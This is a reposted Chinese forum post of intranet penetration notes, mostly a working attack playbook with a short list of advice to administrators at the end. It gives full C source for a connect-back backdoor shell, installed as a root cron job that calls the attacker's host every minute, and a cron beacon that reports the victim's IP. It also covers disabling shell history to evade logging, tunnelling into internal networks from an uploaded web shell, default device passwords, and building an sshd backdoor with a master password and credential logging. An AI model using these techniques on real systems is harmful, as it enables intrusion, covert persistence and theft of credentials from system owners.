@@ -1,0 +1,159 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+内网渗透笔记(zz)
+D8888D主贴内容-------------------------------------------------------
+by：[url=http://www.t00ls.net/mailto:vitter@safechina.net]链接标记vitter@safechina.net[/url] 
+blog：blog.securitycn.net 用nst的反弹后门连上nc后不能su交互，报错如下： 
+standard in must be a tty 
+解决方法： 
+python -c ’import pty; pty.spawn("/bin/sh")’ 
+得到shell就可以su进行交互了。 ps：最近渗透测试中遇到的几个值得注意的情况，记录下： 1.history不记录： 
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 2.history 
+n   ：数字，意思是‘要列出最近的 n 笔命令列表’的意思！ 
+-c  ：将目前的 shell 中的所有 history 内容全部消除 
+-a  ：将目前新增的 history 指令新增入 histfiles 中，若没有加 histfiles ， 
+      则预设写入 ~/.bash_history 
+-r  ：将 histfiles 的内容读到目前这个 shell 的 history 记忆中； 
+-w  ：将目前的 history 记忆内容写入 histfiles 中！ 3.正确的删除文件做法是用shred 
+shred -n 31337 -z -u file_to_delete 4.内网ssh映射 
+可以用ssh隧道代理的方式访问：plink root@公网ip -D 127.0.0.1:8080 然后ie代理socks5代理设置为127.0.0.1:8080就可以访问内网了：[url=http://192.168.0.1]链接标记http://192.168.0.1[/url] 5.改了一个c写的端口映射的工具proxy，2个版本，一个是加参数的。另一个改的读取配置文件的。源码以后公布。 
+/usr/local/bin/proxy 2080 192.168.0.7 80 把0.7的80端口映射到本机的2080端口。 6.Windows下SuperO Doctor III管理后台，可用VNC：（超微主板带的管理工具，有点类似IPMI之类的） 
+值得注意的是，由于SuperO Doctor III分別采用到Xitami web server、TridiaVNC、SndMail 2.1以及WMI（Windows Management Instrumentation） Core 1.5，所以必须使用不同的帐号密码才能进行设置上的修改。系統登录以及Xitami web server预设默认帐号密码是ADMIN/ADMIN，而TridiaVNC密码则是abcde，而非Windows系統管理员的帐号。 7.Welcome to EIS System! 
+改设备的默认Telnet用户名和密码是admin/admin 8.reDuh，一个不错的工具，可以映射内网端口到http或https端口的http服务上： 
+服务端有aps、jsp、php版，具体下载：[url=http://www.sensepost.com/research/reDuh]链接标记http://www.sensepost.com/research/reDuh[/url]。下面简单说下这个工具 
+先在服务器上传服务端：访问[url=http://www.xxx.com/shell/reduh.jsp]链接标记http://www.xxx.com/shell/reduh.jsp[/url]如下： 
+[reDuhError]Undefined Request 
+说明工作正常。在本地： 
+D:\Tools\reDuh\0.2\reDuhClient>java reDuhClient [url=http://www.xxx.com]链接标记www.xxx.com[/url] 80 /shell/reduh.jsp 
+[Info]Querying remote JSP for usable remote RPC port 
+[Info]Remote RPC port chosen as 42001 
+[Info]Attempting to start reDuh.jsp from [url=http://www.xxx.com:80/shell/reduh.jsp]链接标记www.xxx.com:80/shell/reduh.jsp[/url] and set 
+ting remote RPC port to 42001. Please wait... 
+[InfoL]reDuhClient service listener started on local port 1010 
+[InfoL]Caught new service connection on port 1010 
+本地默认监听1010端口： 
+D:\Tools>nc -vv 127.0.0.1 1010 
+DNS fwd/rev mismatch: localhost != vitter 
+localhost [127.0.0.1] 1010 (?) open 
+Welcome to the reDuh command line 
+>>[createTunnel]5900:192.168.0.3:5900 
+Successfully bound locally to port 5900. Awaiting connections. 
+出现这个提示就ok了，[createTunnel]本地映射出的端口:被映射的内网ip:被映射的内网ip端口 
+然后就可以用vnc连接127.0.0.1的5900端口就是连攻击内网的192.168.0.3的服务器了。 9.对于ip不固定的怎么确认ip： 
+我的做法是在被攻击机器上crond里面跑一个脚本定时访问我写的一个jsp文件。 
+[root@cactiez etc]# cat /etc/cron.hourly/curl  
+#!/bin/sh 
+/usr/bin/curl [url=http://xxx.xxx.com/ip/getip.jsp]链接标记http://xxx.xxx.com/ip/getip.jsp[/url]  
+
+该jsp代码如下： 
+----------------------------代码开始分割线----------------------------- 
+<%@ page contentType="text/html; charset=GB2312"%> 
+<%@ page language="java" %> 
+<%@ page import="java.io.*" %> 
+<% 
+String str = request.getRemoteAddr(); 
+java.text.SimpleDateFormat formatter = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); 
+java.util.Date currentTime = new java.util.Date(); 
+String str_date1 = formatter.format(currentTime);  
+String agent = request.getHeader("user-agent"); 
+String nameOfTextFile = "/usr/local/www/home/default-web/ip.txt"; 
+try {  
+  PrintWriter pw = new PrintWriter(new FileOutputStream(nameOfTextFile)); 
+  pw.println(str_date1); 
+  pw.println(agent); 
+  pw.println(str); 
+  pw.close(); 
+} catch(IOException e) { 
+  out.println(e.getMessage()); 
+} 
+%>         
+----------------------------代码结束分割线----------------------------- 
+ip地址记录在了/usr/local/www/home/default-web/ip.txt文件里面，格式如下： 
+2009-05-06 15:19:23 
+curl/7.15.5 (i686-redhat-linux-gnu) libcurl/7.15.5 OpenSSL/0.9.8b zlib/1.2.3 libidn/0.6.5 
+123.123.123.254 10.如何在webshell反弹后门回来后停止apache： 
+由python -c ’import pty; pty.spawn("/bin/sh")’得到一个可以交互的shell，在有root密码的前提下可以su，但是发现不能停止httpd，因为这个shell的父进程是httpd的，如果httpd被stop后，发现后门直接就挂了。可以crond去跑这个后门得到shell不要用webshell跑，在这个shell里面停止httpd（因为该内网服务器段只被映射这一个ip的80端口出来，现在这个80端口要做内网映射到网关上，可以直接远程管理设备，开DMZ之后入侵其他内网服务器）。 
+本地：nc -l -p 5555 
+服务器上： 
+[root@cactiez etc]# cat /home/www/haha.c 
+----------------------------代码开始分割线----------------------------- 
+#include <stdio.h> 
+#include <sys/types.h> 
+#include <sys/socket.h> 
+#include <unistd.h> 
+#include <fcntl.h>  
+#include <netinet/in.h> 
+#include <netdb.h>  
+int fd, sock; 
+int port = 5555; 
+struct sockaddr_in addr;  
+char mesg[]  = "::Connect-Back Backdoor:: CMD: "; 
+char shell[] = "/bin/sh";  
+int main(int argc, char *argv[]) { 
+        while(argc<2) { 
+        fprintf(stderr, " %s <ip> ", argv[0]); 
+        exit(0); }  
+addr.sin_family = AF_INET; 
+addr.sin_port = htons(port); 
+addr.sin_addr.s_addr = inet_addr(argv[1]); 
+fd = socket(AF_INET, SOCK_STREAM, 0); 
+connect(fd, (struct sockaddr*)&addr, sizeof(addr));  
+send(fd, mesg, sizeof(mesg), 0);  
+dup2(fd, 0); 
+dup2(fd, 1); 
+dup2(fd, 2); 
+execl(shell, "in.telnetd", 0);  
+close(fd); 
+return 1; 
+} 
+----------------------------代码结束分割线----------------------------- 
+[root@cactiez etc]# gcc -o /bin/haha /home/www/haha.c 
+[root@cactiez etc]# mkdir /etc/cr_m 
+[root@cactiez etc]# cp /home/www/si /etc/cr_m/ 
+[root@cactiez etc]# chmod +x /etc/cr_m/si  
+[root@cactiez etc]# cat /etc/cr_m/si  
+#!/bin/sh 
+/bin/haha xxx.xxx.xxx.xx 追加一个crontab每分钟执行的： 
+[root@cactiez etc]# echo "*/1 * * * * root run-parts /etc/cr_m" >> /etc/crontab  
+[root@cactiez etc]# cat /etc/crontab  
+SHELL=/bin/bash 
+PATH=/sbin:/bin:/usr/sbin:/usr/bin 
+MAILTO=root 
+HOME=/  
+# run-parts 
+01 * * * * root run-parts /etc/cron.hourly 
+02 4 * * * root run-parts /etc/cron.daily 
+22 4 * * 0 root run-parts /etc/cron.weekly 
+42 4 1 * * root run-parts /etc/cron.monthly 
+*/1 * * * * root run-parts /etc/cr_m 
+1分钟后本地nc监听的就连上了，然后在这个里面停止httpd： 
+[root@cactiez etc]# cat /root/s.sh 
+#!/bin/sh 
+/sbin/service httpd stop 
+/usr/local/bin/proxy 80 192.168.0.1 80 
+sleep 600 
+killall -9 proxy 
+/sbin/service httpd restart 
+[root@cactiez etc]# /root/s.sh & 
+现在连接这机器的公网ip的80端口就已经是网关192.168.0.1的80端口了，赶紧的设置DMZ，搞定内网机器。 
+11.sshd后门： 
+打完补丁后，需要修改2个文件：version.h和includes.h。 
+version.h里面： 
+#define SSH_VERSION    "OpenSSH_4.3" 
+引号里面的版本号。 
+includes.h里面： 
+#define _SECRET_PASSWD "passwerd" 
+#define _LOG_DIR "/dev/hdal" 
+#define _S_LOG "slog" 
+#define _C_LOG "clog" 
+万用密码和记录密码路径和文件。 
+[root@cactiez openssh]# ./configure --prefix=/usr --sysconfdir=/etc/ssh  
+[root@cactiez openssh]# make && make install  
+[root@cactiez openssh]# cp ssh_config sshd_config /etc/ssh/  
+[root@cactiez openssh]# service sshd restart  
+另外有几个要提醒管理员的是： 
+1.不要允许root远程ssh登录，只允许特定组的用户远程ssh登录并且只允许该组用户su –； 
+2.用户名密码不要设置的有规律，尤其是有多台服务器的管理员，不要不同机器的密码区别只是在ip上，这样很容易被攻击者拿到一个密码就猜到其他的密码（一直有一台机器没拿下，最后管理员统一改了一个规律性的密码后，被我由已知的猜到了这台服务器的密码），多台机器共用同一个密码的更不可取（好多人公用一个密码，结果就是一个被黑全都遭殃，我就曾用Bruter跑一个密码的字典跑出同一段ip多台服务器）； 
+3.内网不要轻易在网关上映射端口出来，尤其是DMZ映射某些ip的所有端口； 
+4.安全更多的是人的问题，而不是技术问题。
